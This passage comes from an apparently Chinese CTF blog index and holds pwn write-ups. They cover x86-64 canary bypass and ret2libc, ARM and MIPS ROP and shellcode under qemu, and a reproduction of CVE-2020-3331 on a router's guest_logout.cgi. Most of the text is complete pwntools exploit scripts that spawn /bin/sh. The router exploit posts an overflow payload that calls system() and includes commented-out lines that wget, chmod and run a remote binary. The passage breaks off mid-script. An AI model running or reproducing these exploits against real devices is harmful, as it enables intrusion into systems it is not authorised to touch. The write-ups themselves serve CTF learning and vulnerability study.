io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda addr : log.info(addr)ia = lambda : io.interactive()ru(&quot;You have three times&quot;)num=libc.rand()sl(str(num))sleep(0.5)num1=libc.rand()sl(str(num1))sleep(0.5)num2=libc.rand()sl(str(num2))system=elf.plt[&#x27;system&#x27;]bin_sh=0x08049A30ru(&quot;right! You get a chance to pwn it!&quot;)payload=b&#x27;A&#x27;*0x1c+b&#x27;A&#x27;*4+p32(system)+p32(0)+p32(bin_sh)sl(payload)ia()\n\nguess一道保护全开的栈题，利用pthread_create,修改TLS上的canary的值来绕过canary防护，在start_routine函数里面有一个很明显的gets溢出点，在猜随机数的函数里面直接使用’-’跳过输入来泄露程序基址。\n\nru(&quot;Enter the size :&quot;)sl(str(100))ru(&quot;Enter the number of tries :&quot;)sl(str(1))ru(&quot;Enter your guess :&quot;)#num=libc.rand()#sl(str(num))sl(b&#x27;-&#x27;)#pause()ru(b&#x27;You entered &#x27;)base = int(ru(b&#x27; &#x27;)[:-1]) - 0x1579lg(&quot;base:&quot;+hex(base))pop_rdi=base+0x0000000000001793ret=base+0x000000000000101aputs_plt=elf.plt[&#x27;puts&#x27;]+baseputs_got=elf.got[&#x27;puts&#x27;]+baseback=base+0x000000000001436\n\n偏移计算这里得注意需要提前打断点,这里可以看到输入点在libc段上，然后使用tls和canary指令确定canary的位置\n\n\n这里可以确定偏移为0x858，然后构造下面的payload来覆盖canary以及泄露libc基址，再返回到start_routine函数，并且最后的时候有个栈对其的问题，多加几个ret就可以解决了\n完整exp:\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./guess&quot;elf = ELF(banary)libc = ELF(&quot;/home/youlin/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&quot;)#libc=cdll.LoadLibrary(&quot;/home/youlin/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda addr : log.info(addr)ia = lambda : io.interactive()#num=libc.time(0)#libc.srand(num)ru(&quot;Enter the size :&quot;)sl(str(100))ru(&quot;Enter the number of tries :&quot;)sl(str(1))ru(&quot;Enter your guess :&quot;)#num=libc.rand()#sl(str(num))#gdb.attach(io,&#x27;b *$rebase(0x0000000000001458)&#x27;)#pause()sl(b&#x27;-&#x27;)#pause()ru(b&#x27;You entered &#x27;)base = int(ru(b&#x27; &#x27;)[:-1]) - 0x1579lg(&quot;base:&quot;+hex(base))pop_rdi=base+0x0000000000001793ret=base+0x000000000000101aputs_plt=elf.plt[&#x27;puts&#x27;]+baseputs_got=elf.got[&#x27;puts&#x27;]+baseback=base+0x000000000001436ru(&quot;&gt; \\n&quot;)#payload=b&#x27;A&#x27;*0x18+p64(0xdeadbeef)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(back)#payload=payload.ljust(0x858,b&#x27;\\x00&#x27;)+p64(0xdeadbeef)payload=b&#x27;A&#x27;*8#pause()sl(payload)libcbase=uu64()-libc.sym[&#x27;puts&#x27;]lg(&quot;libcbase:&quot;+hex(libcbase))bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))system=libcbase+libc.sym[&#x27;system&#x27;]ru(&quot;&gt; \\n&quot;)#pause()payload=b&#x27;A&#x27;*0x18+p64(0xdeadbeef)+p64(0)+p64(ret)*0x23+p64(pop_rdi)+p64(bin_sh)+p64(system)io.sendline(payload)ia()\n\npwn_timemaster控制好 alloca 函数申请的栈空间，利⽤ - 泄露 canary，然后利用ask_again函数的栈溢出漏洞打ret2libc\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./pwn&quot;elf = ELF(banary)libc = ELF(&quot;./tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process(banary)else:    io = remote(ip, port)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda addr : log.info(addr)ia = lambda : io.interactive()def double_to_hex(f):    return struct.unpack(&#x27;&lt;Q&#x27;, struct.pack(&#x27;&lt;d&#x27;, float(f)))[0]ru(&quot;What is your name?\\n&gt;&quot;)payload=b&#x27;/bin/sh&#x27;sl(payload)ru(&quot;How many times do you want to try?\\n&gt;&quot;)gdb.attach(io,&#x27;b *0x0000000000400956&#x27;)pause()#dbg()sl(b&#x27;14&#x27;)pause()ru(&quot;Time[sec]:&quot;)sl(b&#x27;-&#x27;)s(b&#x27;\\n&#x27;)s(b&#x27;\\n&#x27;)ru(b&#x27;Stop the timer as close to &#x27;)text = ru(b&#x27; &#x27;)canary = double_to_hex(text)lg(&quot;canary:&quot;+hex(canary))pop_rdi=0x0000000000400e93puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]ret=0x00000000004006a6ru(b&#x27; (Y/n) &#x27;)payload=b&#x27;A&#x27;*0x18+p64(canary)+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(0x601ff0)+p64(puts_plt)+p64(elf.sym[&#x27;ask_again&#x27;])sl(payload)libcbase=uu64()-0x23fc0lg(&quot;libcbase:&quot;+hex(libcbase))system=libcbase+libc.sym[&#x27;system&#x27;]bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))payload=b&#x27;A&#x27;*0x18+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)sl(payload)ia()\n"},{"title":"异构学习","url":"/2024/03/15/%E5%BC%82%E6%9E%84%E5%AD%A6%E4%B9%A0/","content":"前言异构的getshell与命令执行这方面一直都比较薄弱，虽然之前星盟里面国资师傅有过培训，但是内容都比较简单，在真实的iot设备方面的构造还是有所欠缺，所以这次重新学习一下这方面的内容\n参考链接:\nhttps://github.com/ReAbout/pwn-exercise-iot\narm架构基础知识arm函数调用约定ARM 32位：\n\n参数1-参数4 分别保存到 R0-R3 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 R0 中。\nARM中使用R0作为默认的返回值。 ARM 64位：\n参数1-参数8 分别保存到 X0-X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。\n\n常见函数调用约定(x86、x64、arm、arm64)\narm汇编https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#arm\npwn例题:typobinary:typo\n两种方法\n1.ret2shellcode这种方法没记错的话只能在自己本地打通，因为是通过调试获取的栈地址会随着qemu发生变化，在远程大概率栈地址是不一样的\n直接通过调试获得偏移地址，接着把shellcode写在栈上，然后覆盖返回地址为shellcode的地址就可以了\nexp:\nfrom pwn import *from ctypes import *from struct import pack#banary = &quot;./pwn&quot;#elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 0if local:    io = process([&quot;qemu-arm-static&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi&quot;,&quot;./typo&quot;])else:    io = process([&quot;qemu-arm-static&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./typo&quot;])context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;arm&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()ru(&quot;Input ~ if you want to quit&quot;)s(b&#x27;\\n&#x27;)sleep(0.5)io.recv()payload=asm(shellcraft.sh()).ljust(112,b&#x27;A&#x27;)+p32(0xfffeef44)#shellcodesl(payload)ia()\n\n2.ropsvc：r7=0xb；R0=addr(“/bin/sh”)；R1=0；R2=0以上系统调用等同于execve(“&#x2F;bin&#x2F;sh”,0,0)\nsvc: 通过这条指令切换到 svc 模式（svc 替代了以前的 swi 指令，是 ARM 提供的系统调用指令），进入到软件中断处理函数（ SWI handler ）。\n所以我们RoP目标状态如下：\n\nR0 &#x3D; “&#x2F;bin&#x2F;sh”\nR1 &#x3D; 0\nR2 &#x3D; 0\nR7 &#x3D; 0xb （对应arm下execve的系统调用）\nsvc\n\n1.&#x2F;bin&#x2F;sh的地址可以通过ida直接找到:0x006C384\n2.rop\n\n在这里 pc 相当于x86的ret，构成gadget。\n\n0x00020904 : pop &#123;r0, r4, pc&#125;   0x00068bec : pop &#123;r1, pc&#125;   0x00014068 : pop &#123;r7, pc&#125;   \n\n没有r2寄存器gadget，需要通过mov方式赋值，我们这有r4的，找个 mov r2 , r4。再通过blx r3跳转回去\n(typo/ELF/ARM)&gt; search mov r2, r4[INFO] Searching for gadgets: mov r2, r4[INFO] File: typo0x0003338c: mov r2, r4; blx r3;\n\n于是还需要找能够控制r3寄存器的gadget\n(typo/ELF/ARM)&gt; search pop &#123;r3[INFO] Searching for gadgets: pop &#123;r3[INFO] File: typo0x00053d10: pop &#123;r3, lr&#125;; bx r3; 0x00008160: pop &#123;r3, pc&#125;; #选择这个\n\n最后找svc的gadget\n(typo/ELF/ARM)&gt; search svc[INFO] Searching for gadgets: svc[INFO] File: typo0x00023b78: svc #0; b #0x1ba94; ldr r3, [pc, #0xa8]; ldr r0, [r3, #4]; sub sp, fp, #0x20; pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; 0x00021538: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x19598; mov r0, r3; pop &#123;r4, r5, r6, r7, r8, pc&#125;; 0x0002165c: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x19674; mov r0, r3; pop &#123;r7, pc&#125;; 0x000220c0: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x1a0d8; mov r0, r3; pop &#123;r7, pc&#125;; 0x00024210: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x1c254; mov r0, r3; pop &#123;r7, pc&#125;; 0x0003147c: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x294b0; mov r0, r3; pop &#123;r7, pc&#125;; 0x00047a54: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x3fa88; mov r0, r3; pop &#123;r3, r4, r7, pc&#125;; 0x00048354: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x4036c; mov r0, r3; pop &#123;r7, pc&#125;; 0x0004839c: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x403b4; mov r0, r3; pop &#123;r7, pc&#125;; 0x00048454: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x4046c; mov r0, r3; pop &#123;r7, pc&#125;; 0x0004858c: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x405a4; mov r0, r3; pop &#123;r7, pc&#125;; 0x0005e200: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0x56218; mov r0, r3; pop &#123;r7, pc&#125;; 0x00014054: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0xc06c; mov r0, r3; pop &#123;r7, pc&#125;; 0x00014a5c: svc #0; cmn r0, #0x1000; mov r3, r0; bhi #0xca74; mov r0, r3; pop &#123;r3, r4, r7, pc&#125;; 0x00024014: svc #0; ldr r7, [r6, #-0x43c]; and r3, r7, #0xc; cmp r3, #4; beq #0x1c000; pop &#123;r4, r5, r6, r7, r8, pc&#125;; 0x0003226c: svc #0; mov r0, #0; pop &#123;r3, r4, r5, r6, r7, pc&#125;; 0x0001edf0: svc #0; mov r0, #0; pop &#123;r3, r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; 0x00030bd8: svc #0; mov r0, #0; sub sp, fp, #0x20; pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; 0x0000ddc0: svc #0; mov r0, r6; add sp, sp, #0xc; pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; 0x0003b4bc: svc #0; mov r0, r6; pop &#123;r4, r5, r6, r7, r8, pc&#125;; 0x00039f60: svc #0; mov r0, r8; pop &#123;r4, r5, r6, r7, r8, pc&#125;; 0x0000fed0: svc #0; pop &#123;r3, r4, r5, r6, r7, pc&#125;; 0x00016368: svc #0; pop &#123;r4, r5, r6, r7, pc&#125;; 0x0001aca8: svc #0; pop &#123;r4, r5, r6, r7, r8, pc&#125;; 0x00019568: svc #0; pop &#123;r4, r5, r6, r7, r8, sb, pc&#125;; 0x000482fc: svc #0; pop &#123;r7&#125;; bx lr; 0x000505c0: svc #0; sub sp, fp, #0x20; pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; 0x00008150: svceq #0x89832c; orrvs sp, lr, #140, #6; push &#123;r3, lr&#125;; bl #0xbd4; pop &#123;r3, pc&#125;; \n\n至此所需要的gadget全部找到，就可以直接写rop了\nexp:\nfrom pwn import *from ctypes import *from struct import pack#banary = &quot;./pwn&quot;#elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process([&quot;qemu-arm-static&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi&quot;,&quot;./typo&quot;])else:    io = process([&quot;qemu-arm-static&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./typo&quot;])context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;arm&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()ru(&quot;Input ~ if you want to quit&quot;)s(b&#x27;\\n&#x27;)sleep(0.5)io.recv()#payload=asm(shellcraft.sh()).ljust(112,b&#x27;A&#x27;)+p32(0xfffeef44)#shellcodepop_r0_r4_pc=0x00020904bin_sh=0x006C384svc_0=0x00023b78pop_r7_pc=0x00014068pop_r1_pc=0x00068becmov_r2_r4_blx_r3=0x0003338cpop_r3_pc=0x00008160payload=b&#x27;A&#x27;*112+p32(pop_r7_pc)+p32(0xb)+p32(pop_r1_pc)+p32(0)+p32(pop_r0_r4_pc)+p32(bin_sh)+p32(0)+p32(pop_r3_pc)+p32(svc_0)+p32(mov_r2_r4_blx_r3)#pause()sl(payload)ia()\n\nmips架构基础知识MIPS 重要特性\nmips本身不支持NX\n\nMIPS 函数调用约定\n调用者将参数保存在寄存器 $a0 - $a3 中。其总共能保存4个参数。如果有更多的参数，或者有传值的结构，其将被保存在栈中。\n调用者使用 jal 加上子程序的标记。返回地址保存在 $ra 中。\n返回地址是 PC + 4，PC 是 jal 指令的地址。\n如果被调用者使用框架指针，它通常将其设置为栈指针。旧的栈指针必须在之前被保存到栈中。\n被调用者通常在开头将其需要使用的寄存器保存到栈中。如果被调用者调用了辅助子程序，必须将 $ra入栈，同时也必须将临时寄存器或被保留的寄存器入栈。\n当子程序结束，返回值要保存在 $v0 - $v1 中。\n被调用者使用 jr $ra 返回到调用者那里。\n\nRef:https://www.jianshu.com/p/79895392ecb2\nMIPS 寄存器\n\n\n寄存器编号\n别名\n用途\n\n\n\n$0\n$zero\n常量0(constant value 0)\n\n\n$1\n$at\n保留给汇编器(Reserved for assembler)\n\n\n$2-$3\n$v0-$v1\n函数调用返回值(values for results and expression evaluation)\n\n\n$4-$7\n$a0-$a3\n函数调用参数(arguments)\n\n\n$8-$15\n$t0-$t7\n暂时的(或随便用的)\n\n\n$16-$23\n$s0-$s7\n保存的(或如果用，需要SAVE&#x2F;RESTORE的)(saved)\n\n\n$24-$25\n$t8-$t9\n暂时的(或随便用的)\n\n\n$28\n$gp\n全局指针(Global Pointer)\n\n\n$29\n$sp\n堆栈指针(Stack Pointer)\n\n\n$30\n$fp&#x2F;$s8\n栈帧指针(Frame Pointer)\n\n\n$31\n$ra\n返回地址(return address)\n\n\n基础知识:https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#mips\n前期准备ida的mipsrop插件:https://github.com/tacnetsol/ida\n用ropper或者ROPgadget都不太好找gadget?\n例题HWS夏令营结营赛题:pwn运行：\nqemu-mips-static ./pwn\n\n调试:\nqemu-mips-static -g 1234 ./pwn\n\n保护措施\n\n分析题目代码有个很明显的memcpy造成的栈溢出\n\n只是格式有点要求，直接调试不能直接获得偏移，会在下面这个地方卡住，具体原因就不太懂了\n\n只能通过去找输入的地址以及最后给到ra寄存器值的地址然后计算出偏移\n\n找到偏移之后就是利用mipsrop去找需要的gadget\n思路大概是，找一个能将栈上的地址放进寄存器的gadget，再找一个对应的gadget可以jalr或者jr这个寄存器过去执行shellcode\nPython&gt;mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s0                             ||  0x0042BCD0  |  addiu $a2,$sp,0x88+var_C                            |  jalr  $s2                             ||  0x0042FA00  |  addiu $v1,$sp,0x138+var_104                         |  jalr  $s1                             ||  0x004491F8  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             ||  0x0044931C  |  addiu $v0,$sp,0x30+var_8                            |  jalr  $s1                             ||  0x00449444  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             ||  0x0044AD58  |  addiu $a1,$sp,0x60+var_28                           |  jalr  $s4                             ||  0x0044AEFC  |  addiu $a1,$sp,0x64+var_28                           |  jalr  $s5                             ||  0x0044B154  |  addiu $a1,$sp,0x6C+var_38                           |  jalr  $s2                             ||  0x0044B1EC  |  addiu $v0,$sp,0x6C+var_40                           |  jalr  $s2                             ||  0x0044B3EC  |  addiu $v0,$sp,0x170+var_130                         |  jalr  $s0                             ||  0x00454E94  |  addiu $s7,$sp,0xB8+var_98                           |  jalr  $s3                             ||  0x00465BEC  |  addiu $a1,$sp,0xC4+var_98                           |  jalr  $s0                             |----------------------------------------------------------------------------------------------------------------\n\n首先找到这个0x004273C4这个gadget，可以将栈地址给到a2寄存器，然后去找能够jalr或者jr a2的gadget\nPython&gt;mipsrop.find(&quot;jr&quot;)----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x004002FC  |  jr $ra                                              |  jr    0x1C+var_s0($sp)                ||  0x0041F518  |  jr $t9                                              |  jr    $s1                             ||  0x0041F538  |  jr $t9                                              |  jr    $s1                             ||  0x00421684  |  jr $t9                                              |  jr    $a2                             |.text:00421684 00 C0 C8 25                   move    $t9, $a2.text:00421688 03 20 00 08                   jr      $t9\n\n很明显可以利用0x00421684这段gadget\n然后就是想办法怎么执行第一段gadget1后接着执行gadget2，先看看这两端gadget\n0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s0 0x00421684  |  jr $t9                                              |  jr    $a2  \n\n可以看到第一段gadget最后会jalr到$s0这个寄存器，而在pwn函数的最后刚好可以控制这个寄存器\n\n经过调试确定偏移为0x6c,然后就是在程序最后sp+0x64的地方写上shellcode就可以getshell了\nfrom pwn import *from ctypes import *from struct import pack#banary = &quot;./pwn&quot;#elf = ELF(banary)#libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 1if local:    io = process([&quot;qemu-mips-static&quot;,&quot;-L&quot;,&quot;/usr/mipsel-linux-gnu/&quot;,&quot;./pwn&quot;])else:    io = process([&quot;qemu-mips-static&quot;,&quot;-L&quot;,&quot;/usr/mipsel-linux-gnu/&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;,endian=&quot;big&quot;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))lg = lambda data : io.success(&#x27;%s -&gt; 0x%x&#x27; % (data, eval(data)))ia = lambda : io.interactive()ru(&quot;Enter the group number:&quot;)sl(str(1))jr_a2=0x0421684addiu_a2=0x4273c4 #addiu $a2,$sp,0x70+var_C jalr  $s0ru(&quot;&#x27;1:Job.&#x27;&quot;)payload=b&#x27;1:&#x27;payload += b&#x27;a&#x27;*0x6c + p32(jr_a2) + b&#x27;a&#x27;*0x20 + p32(addiu_a2)payload += b&#x27;a&#x27;*0x64 + asm(shellcraft.sh())sl(payload)ia()\n\nCVE-2020-3331复现参考:https://github.com/ReAbout/pwn-exercise-iot/blob/main/linux_mips_stack/mips_iot_cc/pwn.md\n上面链接有固件下载链接还有复现环境，但是不推荐使用他里面的复现环境(docker)，因为版本太老的原因，会出现很多问题，不如直接自己使用qemu模拟环境\n漏洞出现的位置:guest_logout_cgi函数当中对于sscanf对于submit_button参数的处理\nsscanf 与我们熟悉的 scanf 非常类似，二者的区别在于：在调用 sscanf 时，需要将带解析的字符串作为第一个参数传入；而在调用 scanf 时，待解析的参数则是来自标准输入。为了更好地理解 sscanf 的功能，不妨先来看一个例子：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;    int a, b, c;    char string[15] = &quot;1 2 3&quot;;    sscanf(string, &quot;%d %d %d&quot;, &amp;a, &amp;b, &amp;c);    printf(&quot;%d %d %d\\n&quot;, a, b, c);    system(&quot;pause&quot;);&#125;\n\n在本例中， sscanf 利用格式化字符串 “%d %d %d” 将 string 中的1、2、3分别赋值给了变量 a 、 b 和 c 。\nsscanf 利用格式化字符串 “%[^;];%*[^&#x3D;]&#x3D;%[^\\n]” 将 v11 分成了6个部分，其中 sub_string1 是一个不含 ‘;’ 的字符串（对应 %[^;] ），其值将被赋给 v29; sub_string2 是一个不含 ‘&#x3D;’ 的字符串（对应 %*[^&#x3D;] ，此处 ***** 起到舍弃该值的作用），其值将被丢弃； sub_string3 是一个不含 ‘\\n’ 的字符串（对应 %[^\\n] ），其值将被赋给 v28。例如，若 v11 &#x3D; “AAAA;var&#x3D;BBBB\\n” ，则 v29 &#x3D; “AAAA” 、 v28 &#x3D; “BBBB” 。\n而触发漏洞需要满足下面三个条件:\n\nv5 !&#x3D; NULL &amp;&amp; v10 !&#x3D; NULL\nv5 是一个合法的MAC地址 &amp;&amp; v10 是一个合法的IPv4地址\nv11 中需要包含子串 “status_guestnet.asp” 。\n\nv5&#x3D;get_cgi(“cmac”);\nv10 &#x3D; get_cgi(“cip”);\nv11 &#x3D; get_cgi(“submit_button”);\n然后就可以想办法构造payload了，这个固件比较凑巧在函数最后返回的时候，a0刚好是前面sscanf的第一个参数，也就是在程序最后溢出控制返回地址为system时的第一个参数刚好就是我们前面的输入值\nexp:\n#!/usr/bin/python3from pwn import *import requestsfrom threading import Threadcontext(arch=&#x27;mips&#x27;, endian=&#x27;little&#x27;, os=&#x27;linux&#x27;)system = 0x0047A610cmd  = &#x27;\\n&#x27;#cmd += &#x27;wget http://192.168.2.1:8000/tools/msf -O /msf\\n&#x27;#cmd += &#x27;chmod 777 /msf\\n&#x27;#cmd += &#x27;/msf\\n&#x27;cmd += &#x27;echo &quot;pwn_sucess&quot; &gt; /tmp/test.txt\\n&#x27;assert(len(cmd) &lt; 0x55)payload = b&quot;status_guestnet.asp&quot; + cmd.ljust(0x55,&#x27;b&#x27;).encode() + p32(system) #payload=b&quot;status_guestnet.asp&quot; + b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#x27;data = &#123;&quot;cmac&quot;:&quot;12:af:aa:bb:cc:dd&quot;, &quot;submit_button&quot;:payload, &quot;cip&quot;:&quot;192.168.100.1&quot;&#125;def attack():    try:        requests.post(&quot;http://192.168.182.21/guest_logout.cgi&quot;, data=data, timeout=1)    except Exception as e:        print(e)thread = Thread(target=attack)thread.start()io = listen(31337)io.wait_for_connection()log.success(&quot;getshell&quot;)io.interactive()thread.join()\n\n"},{"title":"强网拟态初赛pwn部分wp","url":"/2024/10/28/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/","content":"运气还行 进决赛了\nPWNsignin套了个随机数绕过的栈迁移\nfrom pwn import *from ctypes import *from struct import packbanary = &quot;./vuln&quot;elf = ELF(banary)libc = ELF(&quot;./libc.so.6&quot;)#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)libc1=cdll.LoadLibrary(&quot;./libc.so.6&quot;)ip = &#x27;&#x27;port = 0local = 0if local:    io = process(banary)else:    io = remote(&quot;pwn-0e0144d48f.challenge.xctf.org.cn&quot;, 9999, ssl=True)context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)def dbg():    gdb.attach(io)    pause()s = lambda data : io.send(data)sl = lambda data : io.sendline(data)sa = lambda text, data : io.sendafter(text, data)sla = lambda text, data : io.sendlineafter(text, data)r = lambda : io.recv()ru = lambda text : io.recvuntil(text)uu32 = lambda : u32(io.recvuntil(b&quot;\\xff&quot;)[-4:].ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda : u64(io.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))iuu32 = lambda : int(io.recv(10),16)iuu64 = lambda : int(io.recv(6),16)uheap = lambda : 